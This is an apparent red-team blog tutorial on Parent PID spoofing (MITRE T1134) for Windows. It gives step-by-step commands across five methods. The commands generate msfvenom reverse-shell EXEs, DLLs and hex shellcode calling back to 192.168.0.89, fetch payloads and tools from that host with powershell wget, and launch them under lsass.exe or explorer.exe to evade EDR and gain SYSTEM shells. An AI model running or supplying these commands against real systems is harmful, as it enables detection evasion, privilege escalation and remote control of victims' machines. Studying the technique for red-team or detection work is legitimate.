<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Parent PID Spoofing (Mitre:T1134)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/parent-pid-spoofing/" rel="bookmark"><time class="entry-date published" datetime="2022-03-19T18:34:57+00:00">March 19, 2022</time><time class="updated" datetime="2025-06-23T19:30:24+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>Parent PID</strong> <strong>spoofing </strong>is an access token manipulation technique that helps an attacker evade defense mechanisms such as heuristic detection by spoofing the PPID of a malicious file to that of a legitimate process like <em data-start="480" data-end="494">explorer.exe</em>. Additionally, attackers use native API calls to explicitly assign the <strong data-start="566" data-end="573">PID</strong>, typically through the <em data-start="597" data-end="612">CreateProcess</em> call in C++. This explicit assignment often provides side benefits, as we will explore in this article.</span></p>
<ul>
<li><span style="color: #000000;"><strong>MITRE TACTIC: Privilege Escalation (TA0004) and Defence Evasion (TA0005)</strong></span></li>
<li><span style="color: #000000;"><strong>MITRE TECHNIQUE ID: T1134 (Access Token Manipulation)</strong></span></li>
<li><span style="color: #000000;"><strong>SUBTITLE: Parent PID Spoofing (T1547.009)</strong></span></li>
</ul>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><span style="color: #000000;">Background</span></li>
<li><span style="color: #000000;">Process, PID and Parent PID</span></li>
<li><span style="color: #000000;">Method 1 (C++ binary for PID Spoofing)</span></li>
<li><span style="color: #000000;">Method 2 (DLL injection by PID Spoofing in powershell)</span></li>
<li><span style="color: #000000;">Method 3 (Powershell script for PID spoofing)</span></li>
<li><span style="color: #000000;">Method 4 (C# binary for PID Spoofing)</span></li>
<li><span style="color: #000000;">Method 5 (Shellcode injection by PID Spoofing)</span></li>
<li><span style="color: #000000;">Conclusion</span></li>
</ul>
<h3><span style="color: #800000;">Background</span></h3>
<p><span style="color: #000000;"><strong data-start="723" data-end="751">Child process monitoring</strong> remains one of the most common techniques in <strong data-start="797" data-end="815">threat hunting</strong>. Specifically, a threat hunter might analyze whether a non-related tool like Adobe Reader or MS Excel spawned a process like conhost.exe or cmd.exe, which may indicate potential compromise. Moreover, <strong data-start="1033" data-end="1049">AV solutions</strong> monitor this behavior under <strong data-start="1078" data-end="1101">heuristic detection</strong> and alert the admin accordingly.</span></p>
<p><span style="color: #000000;">Parent PID spoofing effectively counters that detection. Notably, the PPID method tricks an AV/EDR solution into believing that a legitimate process like <em data-start="1307" data-end="1318">lsass.exe</em> initiated the suspicious activity. Furthermore, by spoofing the process <strong data-start="1391" data-end="1398">PID</strong> to match its parent, an attacker may achieve <strong data-start="1444" data-end="1468">privilege escalation</strong>—especially if the parent is running with SYSTEM privileges, granting inherited SYSTEM rights to the child.</span></p>
<h3><span style="color: #800000;">Process, PID and Parent PID</span></h3>
<p><span style="color: #000000;"><strong>Process: </strong>In Windows, an <strong data-start="1597" data-end="1612">application</strong> comprises one or more <strong data-start="1635" data-end="1648">processes</strong>. Simply put, a process is part of a currently running program. Often, different apps use the same process (e.g., <em data-start="1762" data-end="1771">cmd.exe</em>), and for differentiation, Windows assigns a unique <strong data-start="1824" data-end="1831">PID</strong> (Process Identifier). This helps distinguish one process from another in system memory.</span></p>
<p><span style="color: #000000;"><strong>PID: </strong>The <strong data-start="1930" data-end="1937">PID</strong> (Process Identifier) is a numeric tag that uniquely identifies a running process. For instance, developers often use the <em data-start="2059" data-end="2082">GetCurrentProcessID()</em> function in Windows to retrieve the <strong data-start="2119" data-end="2126">PID</strong> of a specific process during program execution.</span></p>
<p><span style="color: #000000;"><strong>Parent Process: </strong>Parent processes are the processes that can spawn multiple child processes. For example, the command explorer.exe /root,”C:\Windows\System32\cmd.exe” shall spawn cmd.exe as a child process to parent explorer.exe. In code, parents may use fork() system call to spawn the child.</span></p>
<p><span style="color: #000000;"><strong>PPI: </strong>Stands for Parent Process Identifier (PPID) which is a numeric representation given to a parent process. Any process that has child process qualifies to be in a parent-child relationship.</span></p>
<h3><span style="color: #800000;">Method 1 (C++ binary for PID Spoofing)</span></h3>
<p><span style="color: #000000;">Initially, <strong data-start="2574" data-end="2592">Didier Stevens</strong> introduced this method in a public <a href="https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/"><strong>post</strong></a>. . Although the original code became inaccessible in many regions, it remains available through <strong><a style="color: #000000;" href="http://web.archive.org/web/20210225035252/http:/www.didierstevens.com/files/software/SelectMyParent_v0_0_0_1.zip"><span style="color: #0000ff;">Wayback Machine</span></a></strong>. Importantly, I rebuilt the <strong data-start="2773" data-end="2795">SelectMyParent.exe</strong> using Visual Studio 2022 after removing the <code data-start="2840" data-end="2846">.pdb</code> files from both the <strong data-start="2867" data-end="2880">debugging</strong> and <strong data-start="2885" data-end="2904">release folders</strong> to make it functional.<br/>
</span></p>
<p><span style="color: #000000;">At the admin end, you see explorer.exe running on PID 3808.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg5wCfhBP6GyuboLs3w1qUSAjo1e49KqQRwN32s5lpku7j2_vE8PpjYrJbmYO7wq2G_1XH1vEPyxqEeCet2L_-Cw_4bqAzSyONBClM3Ff0_Hfgn6UGPFf2jWGEcG-MnziOKUoQPhSCGM-SJOm1XPUs87czKSGLYdRuxzIn-dFEzx2sH7-hA2pr2_i7f0Q=s16000"/></span></p>
<p><span style="color: #000000;">Thus, to spawn our very own binary under this parent explorer.exe, we can use SelectMyParent.exe like this and you’d see a new process created on the PID mentioned in the output.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SelectMyParent.exe notepad 3808</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh4Ybj08JL4ICNjALwgJ70YDVLHmDJe-cBdOSr3p2YL8mg2FBQeEJsTspPeoh4tSn7gqa-P7uTjC9SYqv5xeljeZ7UMtRvTCW4ZrDIzSiAZMu4Konhc8GkveawXJ1DP5tFpHXLCu8am1GEmCHKcOZzqL4uD-FMRi-wRRUfEdDl_uXha_QJgGBwV436p4g=s16000"/></span></p>
<p><span style="color: #000000;">Upon inspecting in process explorer we can see notepad launched on port 1168</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEio0nEKKLJ2QM2QaFnxzDcWAeq0sbB79SOmvGTSNseTQ2b2LNZz2flXaH_ZfUdH7wfq6J_b4opFXRBEQG5oVGNZ_Riodpo8qv5XuatAG4O-uZ383ngwH9pZVKajC8POgy1w_R0ZOO3ySpZ_9i8MpIv34roRTEb_-GyKhm6oChy8Pslk06MbPaPPIP0bww=s16000"/></span></p>
<p><span style="color: #000000;">Likewise, we can run our own EXE too. Let’s create one exe using msfvenom first and upload the file using python3 web server</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.0.89 LPORT=1337 &gt; shell.exe
python3 -m http.server 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhIf23OfPku6jR_OurUWqpJsUmFQoImvz8a7SSJGFmb5OVLiTW8QaL-5u2j_SCiLge7y0nqtACFUtzT5X-0_uwtHooL42VZbfptTeqt0s_L5pp6xLOJijEV2_YtyzfvRRXwZkbyrKpoSTx9g5dKhcMnfZyeT1lQBjzHOuokATk48Hjk0BlMjfm_uGDycg=s16000"/></span></p>
<p><span style="color: #000000;">While using a compromised terminal, one can view the processes running using tasklist command</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEggKiujkKgksFA0WSK7gGXdWpfFxRYe626ErVkl4odhvcZqnObWs-IbQHCuY076OIzN1lHgymZ_GBGxkgNumfONmDbtW9xU4z8w89JUCBYzMtTWYjKPRhKQYZckWCzXp_0F1gjiHBMVzFZguaHDY6QqiZGM34jpGXWEOLZ8WF9Yh0TWy-xOXXT9s0-6Bw=s16000"/></span></p>
<p><span style="color: #000000;">In the list, you can see lsass.exe process running on port 644 as NT AUTHORITY\SYSTEM</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh3aWeoH094NSgUfawXQHKGAD_aGBS6u2VAAMWNPx4LBhIAJKGM5AyLvTfXd51nWP_6kD7FW3jdV8aBz2zfNvn_8iT9RCNqkaXtngm3daVb6Qp2V_Ua6X_nBnfJye4ZuZiEDrxtk_j29aq1D2fFXW4bjkdwL9xxxnRSYri42182ABr4-9Q_1g21YBFWBQ=s16000"/></span></p>
<p><span style="color: #000000;">So, I’ll run the SelectMyParent.exe by specifying the shell I uploaded and PID of lsass.exe</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SelectMyParent.exe shell.exe 644</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgGzIpOldc19gETM8GuJLJXkcqEVonof3UEP_jdPk30brnojDt_Fi0zsq5C4wrbjlWpZVN-PkFtLRHjyk7Hj0kIp1zdCk2fIDULTW19jQ4H6yVwW262fXAxDoKYfkHv8S0VAqnp_d75iPQ3nhaa__GCp5ONBAi60JdIuuBoprOXDjbX9bfeGNEJw_oMrw=s16000"/></span></p>
<p><span style="color: #000000;">As you can see, on port 1337, I receive a callback as NT AUTHORITY\SYSTEM indicating that privileges have been escalated!</span></p>
<h3><span style="color: #800000;">Method 2 (DLL injection by PID Spoofing in powershell)</span></h3>
<p><span style="color: #000000;">F-Secure labs created an alternate to Didier’s binary in powershell. They are using the same process as Didier followed, but the main difference is that a child process can spawn with an injected DLL, making it powerful. Spoofing PID performs this injection. The code can be downloaded <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/countercept/ppid-spoofing"><strong>here</strong></a></span>. Further, on a compromised system, an attacker must observe desired PID using a tasklist. Here, we are choosing Powershell as a parent with PID 3488</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiziEmryQNrwLVtRLgCURsJG4Xvuu09xJ0IRhLOybdFqqqbhJSIGxJ5DR6fWGVMPyZ_FlciURHxTGMuBVkRKKO0Psv_54dQPD21HonEHGRDb2fG4J0qvsjBgw9X0aKxO7GeWMlJNj8EtnmJ_Pw61qNAp6JJkMZXzxL0yz1Av0mmEQSpy769PjqROuPlZw=s16000"/></span></p>
<p><span style="color: #000000;">Now, we will use msfvenom to create our own DLL which will be injected in the process</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.0.89 LPORT=1234 -f dll &gt; shell.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhVyVTe5ceh9qqZOEXCYHW0y3QteSvX9jS6r5S7ARfASH2LIMaiYpsbMKX1VP1oIV5U4GWuQtQEr4X0M7emXhNSow2WwRffIX_SPYz_Xue0_U61maAn6itmdMA79CpUVW3SqAxjCymfqL6nohoWsMx2jdUQlVoyipC-PzisMoAm6UPOy2HnG9FquglZ6w=s16000"/></span></p>
<p><span style="color: #000000;">Now, we need to upload the powershell script and run the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\PPID-Spoof.ps1
PPID-Spoof -ppid 3488 -spawnto "C:\Windows\System32\notepad.exe" -dllpath shell.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFm4IMAVg76Xix8N7lsHWBrCIfWcY_q00mxxbCZaBP8oDztvxYucbLx0qq9S2BdgQwVmbyis9_EybVemmRQ6DhqJkObRqIS2O4UBfAwtwLhjfsK5UWLlzMZPO6N6YH29RovoW1x5pDPxV8AcI2hi1IrljnOJ0BGqW_fVi4M7jdRlokdv9t4ShaIuwu6w=s16000"/></span></p>
<p><span style="color: #000000;">As you can see, it worked and a reverse shell received</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgrdtB1mKhPdPld5WMpGV6xTAMxTsA2Ws0W9tqU1lMgUtBenQQtBRpsXupqYYUtzwWFsa8Sk9BvlcJQdNSkKfWbm5jvfB7tx3m70G3zNL3aXAIZN7vmN71ZTFMaGtYksGgrTcTqAwM8RfidsHGQZQ7RSca6Ps1-SFfGlp-xsNVobHuUwX8dKVTym2neOQ=s16000"/></span></p>
<p><span style="color: #000000;">This way, a notepad.exe with injected code (given by DLL) has been spawned as a child to powershell.exe process on PPID 3488</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh3wsHOs9Vd8J9PcvEwv7BUfVD6DRGBarB2rgPTY5nqR-t0UPQKiEKFLUBnl2nBbZnZvpR0CorXHzrwkZTssNr0muEWEa_U70jAGyfbCD53uSWl5-uAreCINoCLbiQfWWa-0_VJaPTlpREQckvcAOYw3QkVSjcIdUW_6JFwjoPOnHOBI46ogwb6H_EQyg=s16000"/></span></p>
<h3><span style="color: #800000;">Method 3 (Powershell script for PID Spoofing)</span></h3>
<p><span style="color: #000000;">Decoder-it developed a powershell script based on the guidelines provided by Didier Stevens. By using the CreateProcessFromParent() method, psgetsystem script which can be found <a style="color: #000000;" href="https://github.com/decoder-it/psgetsystem.git">here</a>, can be used to spawn child process by PID Spoofing. First, we note the PID of our desired process. Here, lsass.exe</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjHWYMWKM1c6zsSJclBpu_CLDATMoyZWjwhHarn_94ODWLiE-VeB25HpgMc5lLcgh7T53ClLdKK9eVa0P-e_WAOTcWrTsyvJ__Qy47ErimXhxWc4GY6F9Eun8UVcbBEhMuJu6DgEZf6jW4luNhF8lEa5i-h7XKTFQllyonJ_lZ1cWF9XlPB8znhbKbymw=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can run the script in powershell like:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
wget 192.168.0.89/psgetsys.ps1 -O psgetsys.ps1
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(636,"C:\Users\Public\shell.exe","")</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgsECbC0g_kWZRaSXlTNSCW5-k-3Wirjan-Jh892X-c3Nt8_YxIfrTWaGxGh5Jy4CZ3FBOurxeuxGZpxUGX5DbZ2CLXML9Ol_GJlrIeKkz0z_6a28K8b0JttxGGIMNk1rAdEb5yHUuAVLNmhZviyJ6N8Q3l2-T4JacizfRVdaLOSOOrQ0Rhi1qxUVv35Q=s16000"/></span></p>
<p><span style="color: #000000;">At the admin end, we can see that a shell.exe has been spawned from lsass.exe process</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjGaYP-Goh1AiMXgmVYUWeKYP9ZAp4X61LwjfzAPJ7ugaAnilji_q_DmfzMkqk9qVPlC3Ql4if13rZ1d3JYn6YfKy-nWX7MlbyeeorgmRv5p26XNz73DBv5V6Vi_xYiQ-uZfJgw-SWVwg2CB93s-2gEsgwY_bv0Ogm_wEqBWMN_DrXwSfeX1YzOAMN-aw=s16000"/></span></p>
<p><span style="color: #000000;">And as a result, a reverse shell has been received.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjBpAKRxhuCuMgoLMmkbcmwP9v9RVukw5bZcWuLqmRxPQX8Spy5mUQMdA82l2YFZcUZezPtqS9nPimeD4ypRAemwNZe7ghKOjjS6Fj9uIa5qP8ah9VG4X3WIesgiDVZG6n_B7KQfHEkjAU0LfGLZO-pYIrlzbNCEmVx14yEOqErYVxrsML_7PyGhcW9vA=s16000"/></span></p>
<h3><span style="color: #800000;">Method 4 (C# binary for PID Spoofing)</span></h3>
<p><span style="color: #000000;">py7hagoras developed the GetSystem project, a C implementation of the same technique we discussed, which you can find <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/py7hagoras/GetSystem.git">here</a></span>.</span></p>
<p><span style="color: #000000;">We simply need to upload this on the victim system and provide the path of the malicious file as argument 1 and the name of the process to spoof as argument 2.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.0.89/GetSystem.exe -O GetSystem.exe
GetSystem.exe shell.exe -O lsass</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhwWxRLB3lYaApKhkdAKwITQF4We9sZhF1oox64UkaII3XC5GgB9n9_O1qBRLMFEU8JLieTnruHfop0bfMw0aeFun8leHq3-520oDgcnNQ0t31VW1uR_EvUspban0qGeaXcc3n71YPRjcdjR7nOEKwVoDJe5IOMCLF7u7xwOJRzQuHANHzhGafMA5GCTw=s16000"/></span></p>
<p><span style="color: #000000;">Now, the tool will automatically find the PID of the process provided as the argument and automatically run the shell</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjkaHpblZrvnxRwTJtZpmSDEFsx4UXm7fDKShjKrvDNvZv3Ks_D7hF6Go7MwkbblazC_w4yZ52QjmQjIPrbkrawlQm9bsLitpSuO54tzPKGhF0TWKHiqxVFUSNRZBP9P3GdAxqPhnCxxJiPnw5w-0u1SfgkKECCsUh17QvA1LrW28_WIFJPSEM44mUK_w=s16000"/></span></p>
<p><span style="color: #000000;">At the admin end, we can see that the lsass process has spawned shell.exe as a child process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiyZ5Z1Tr1DkmJwjgcdKHRKZXhnbhP0dhFMCWoJjTSwlLGZ7-5cPT9ERVM2EoeveyqiB68T4-F1FL_jfE50citMbcR5Trl6vgDvj8hhNPTANMjkKVUjKt54q60nxVFIqvToKfVc1TTv0EPPbulGuC98Gn14IGmpDBOmMjxtXtyyFYnSV-I2dGbulV5Ekg=s16000"/></span></p>
<h3><span style="color: #800000;">Method 5 (Shellcode injection by PID Spoofing)</span></h3>
<p><span style="color: #000000;">Chirag Savla developed a great tool called “ProcessInjection” in C# that can perform a number of functions including Process Injections by PID spoofing. By providing a valid PID, the tool tries to use native API calls like CreateProcess to spoof PID and then inject code in them. The tool supports hex, C and base64 shellcode input and also, DLL injections are an option too by utilizing the same method. Download from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/3xpl01tc0d3r/ProcessInjection">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">First, we need to create a hexadecimal shellcode of a reverse_tcp payload using msfvenom</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.0.89 LPORT=1234 -f hex &gt; hex.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiBV2Nmiixd3FnlY21NNVHDxSVpaQqn_DLVMAebczj3jrFOkh_4kT0kTkHNcyrH2tSC9L5X7gCKk6DCw4NhkP7fyc4fW6UwETGI6xkYMwVxqBRq-gzoYpocXYyvX4Jf9CGw851GK1N21ApLAY3UJ6lWHkEJHF9IOG3nAeidKN1tiUo1so2nrizMYCzQeA=s16000"/></span></p>
<p><span style="color: #000000;">Now that we have made our shellcode, in the victim system we can run the tool. Note that you can view the many flags as input based on the action to be performed by typing “ProcessInjection.exe”.</span></p>
<p><span style="color: #000000;">To run shellcode injection in a process, we use the following flags:</span></p>
<ul>
<li><span style="color: #000000;">/ppath: process path of an EXE that is being targeted</span></li>
<li><span style="color: #000000;">/path: path of the shellcode to be inserted in the targeted exe</span></li>
<li><span style="color: #000000;">/parentproc: EXE targeted shall be spawned under this process</span></li>
<li><span style="color: #000000;">/f: filetype</span></li>
<li><span style="color: #000000;">/t: attack type. Here, /t:1 is a Vanilla Process Injection</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.0.89/hex.txt -O hex.txt
powershell wget 192.168.0.89/ProcessInjection.exe -O ProcessInjection.exe
ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"hex.txt" /parentproc:explorer /f:hex /t:1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhMn7pAMmTp8U3vHNKEpKPfiBpEoOCHDyZ81XshF2F2_P1iD6tURX-_P9dw-rzyd_r8fFr7nyIY92Wy9DmdsBoey2q9ptLUImnID3iGQnthZNy_bdBnW9b2U8wnTxVG06MJYbOAyVhTJKb1b4F4NDORFwDDcsFdoL9e64wr1gZN-kSQg1wbPnPhlv4U7w=s16000"/></span></p>
<p><span style="color: #000000;">As desired, calc.exe has been loaded with our provided shellcode under the explorer.exe process</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjef1dXKs9Y2NatTyNoclQ47imI4E8Or9Xo8Qf4cuZFSP23H6k_YDXI9DkhIyqj2SMDASIr1TQoDKsDk0CHullLYaTIANkWnLs4dNDBmIRpymP7MnSdAwBQZiF-BQMGwYC5HYGMPTNsWtOnn-1tF23hROr8vhGLLo8lBZluS-p_09rlZCr4dthgYiL2HA=s16000"/></span></p>
<p><span style="color: #000000;">And, as expected a reverse shell has been received!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj6Y1xQORM1oN3Fr11G_uQJKbiHWodHp1HgZcI-bnYumBM2LUgcLTIoyeWteKzcaOyGCeS9dRSBZkSRvkoEgruXbWs3uNyhgLu7py8fitS6SrMIH30eUX8goKU1h2vji8K7TWn4sSyPRO-BHx3OH9IGKotTX4T6x3_NWFbvfqEBbGX6hh1ZyKrd6DMmIA=s16000"/></span></p>
<p><span style="color: #000000;">Now, you can also use the same tool to inject DLLs into the desired exe using calls like VirtualAllocEx and WriteProcessMemory.</span></p>
<p><span style="color: #000000;">Firstly, we first need to create our DLL using msfvenom</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.0.89 LPORT=1234 -f dll &gt; shell.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjoh-uLOCfCRPW0fWsJKTNHqDnT4RuDv00RbH9gHozreDtk-DRbv1x46qAR1mveGYFDKSD_JrDlzTZsg4sXJn7nqeVVp9hqGMlGa7NwNdsYW59w3mnrPcweN12ybyVSJFoU_QuW8Rqgy0oEKPXL3OObCh3J8A4S3gN2AkiBEzFZe0zIez92rXYDXubAxg=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can use ProcessInjection.exe with /t:2 for DLL injections to target calc.exe and injecting shell.dll in it like:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:shell.dll /parentproc:explorer /t:2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgxxdlvWFmfQt7KHkun9BQkftEbmnpzvx-y0CX1lslHKkZi8OE53dpg2zmo7Yxcry2nh_W9yKD8pSbeqgCQUX6L5bfpJ1wBFpVGVSFJc6-c7PIRfr9n9AJf1W8YcdbGHr4lZTjtmtNs8IutYf4WZfJNBFLbkpOIo92ZkFuVx7ar4xQ1DEFcsFnqXbN6YQ=s16000"/></span></p>
<p><span style="color: #000000;">As expected, the system has received a reverse shell upon successful execution of the DLL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjrG-bo12hJKdQTw6SvUmclCMMiX4asoz3bNiIx8Fut4_X94VxUvq7KyyHE7kpKUi5WyrREsb1N-AVWZX8OiSRtMGAn-ezg1_hi_OO2EXd5-w0HnUnfAreKuBvVK-fON2pNnQdkCuHfFn2aQCADA6cqX50ZzL0DvxkPbSu_cG1RyhUFBUD7kM5a3FEItQ=s16000"/></span></p>
<p><span style="color: #000000;">Upon inspecting processes in the admin system using process explorer we see that explorer.exe has a child calc.exe which in turn in running our DLL using rundll library</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh0MMprz3sCs8oz-gAGdgLrwE03T7J73-fFJnlaFmGPEg2qG7Dq1tao_ZHQLBWW1iPXF1dgxrWjQzD5ttZr1_umxyOoh5vFS5mxtntbTyJZGYh6Z_VVxgKsyv7X2xn71QoumI6XOQQMke-32zCdOiqQdBEKHWLRCGu5x_Q0gT1oH9j4t5JM67SgSDuXDw=s16000"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">Attackers now widely exploit this <strong data-start="4187" data-end="4200">technique</strong> to conduct stealthy operations, significantly delaying <strong data-start="4256" data-end="4274">threat hunters</strong> from detecting <strong data-start="4290" data-end="4325">Indicators of Compromise (IoCs)</strong>. Unfortunately, many outdated or unpatched <strong data-start="4369" data-end="4386">EDR solutions</strong> fail to detect such techniques. Therefore, this article highlights the importance of keeping security tools up to date and using advanced detection capabilities to thwart <strong data-start="4558" data-end="4582">PID spoofing attacks</strong>.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
